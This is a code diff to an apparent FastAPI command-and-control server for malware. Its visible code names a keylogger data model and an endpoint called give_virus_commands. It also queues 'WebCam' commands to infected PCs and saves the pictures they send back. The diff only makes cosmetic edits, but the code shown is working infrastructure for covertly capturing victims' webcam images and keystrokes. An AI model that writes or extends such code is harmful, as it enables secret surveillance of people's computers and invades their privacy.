@@ -31,7 +31,6 @@ class Key_Logger_Data(BaseModel):
 
 
 
-
 # When the client / admin opens the server web.
 @app.get("/")
 async def start_server():
@@ -91,7 +90,7 @@ async def give_virus_commands(pc_name: str):
 @app.post("/{pc_name}/picture")
 async def give_virus_commands(pc_name: str, picture_data: Picture_Data):
 
-    print(picture_data.picture_content)
+    #print(picture_data.picture_content)
 
     with open(f"transferred_picture_{pc_name}.bmp", "wb") as f:
         f.write(base64.b64decode(picture_data.picture_content))
@@ -141,7 +140,7 @@ async def take_picture(pc_name: str):
     if "WebCam" not in file[pc_name]["commands"]:
         file[pc_name]["commands"].append("WebCam")
 
-    with open ("DB.json", "w") as file_ptr:
+    with open("DB.json", "w") as file_ptr:
         json.dump(file, file_ptr)
     print("pro picture")
     # waiting for the photo to come back
@@ -158,6 +157,7 @@ async def take_picture(pc_name: str):
                 os.remove(f"transferred_picture_{pc_name}.bmp")
 
         await asyncio.sleep(5)  # sleep 5 seconds for other commands to come
+# image response
 
 
 
